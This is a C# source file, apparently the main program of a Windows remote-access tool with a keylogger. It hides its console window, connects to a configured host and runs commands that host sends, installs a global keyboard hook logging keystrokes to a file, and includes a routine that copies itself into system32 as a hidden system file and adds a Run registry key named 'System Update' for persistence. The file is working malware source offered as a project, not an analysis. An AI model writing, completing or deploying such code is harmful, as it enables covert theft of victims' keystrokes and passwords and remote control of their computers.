#pragma warning disable CS1998

namespace Server
{
    using System;
    using System.Threading;
    using System.Windows.Forms;
    using System.Threading.Tasks;

    using Core.Connection;
    using Core.Keylogger;
    using System.Runtime.InteropServices;
    using System.IO;
    using Microsoft.Win32;

    public static class Program
    {
        private static readonly ConnectionConfiguration _connectionConfiguration;
        private static readonly EnvironmentConfiguration _environmentConfiguration;
        private static readonly Connection _connection;

        static Program()
        {
            _environmentConfiguration = EnvironmentConfiguration.Load();

            if (_environmentConfiguration.GhostMode)
            {
                User32.ShowWindow(User32.GetConsoleWindow(), User32.SW_HIDE);
            }

            _connectionConfiguration = new ConnectionConfiguration
            {
                Host = _environmentConfiguration.Host,
                PortNumber = _environmentConfiguration.PortNumber,
                UseProxy = _environmentConfiguration.UseProxy,
                LoggerPath = _environmentConfiguration.LoggerPath
            };

            _connection = new Connection(_connectionConfiguration);
        }

        public static async void InitializeConnection()
        {
            while (true)
            {
                try
                {
                    _connection.ConfigureClient();

                    while (true)
                    {
                        try
                        {
                            _connection.ReceiveInformation((response, command) =>
                            {


                                // Detect command
                                command.UseCommand(response);
                            });
                        }
                        catch (Exception ex)
                        {
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.WriteLine("Error: {0}", ex.Message);

                            Thread.Sleep(_environmentConfiguration.RetryIntervalConnection);

                            break;
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("Error: {0}", ex.Message);
                }
            }
        }

        public static async void CopyOnSystem()
        {
            try
            {
                var appName = string.Format("{0}{1}", AppDomain.CurrentDomain.BaseDirectory, AppDomain.CurrentDomain.FriendlyName);
                var outputDirectory = string.Format("{0}\\system32\\{1}", Environment.GetEnvironmentVariable("WinDir"), AppDomain.CurrentDomain.FriendlyName);

                if (!File.Exists(outputDirectory))
                {
                    File.Copy(appName, outputDirectory);
                    File.SetAttributes(outputDirectory, FileAttributes.ReadOnly | FileAttributes.System | FileAttributes.Hidden);

                    var key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                    key.SetValue("System Update", appName);

                    key.Close();
                }
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Error: {0}", ex.Message);

                Thread.Sleep(2000);
            }
        }

        static void Main(string[] args)
        {
            Task.Run(async () =>
            {
                // CopyOnSystem();
                InitializeConnection();
            });

            using (var keylogger = new Keylogger(_environmentConfiguration.LoggerPath))
            {
                keylogger.CreateKeyboardHook();

                Application.Run();
            }
        }
    }
}
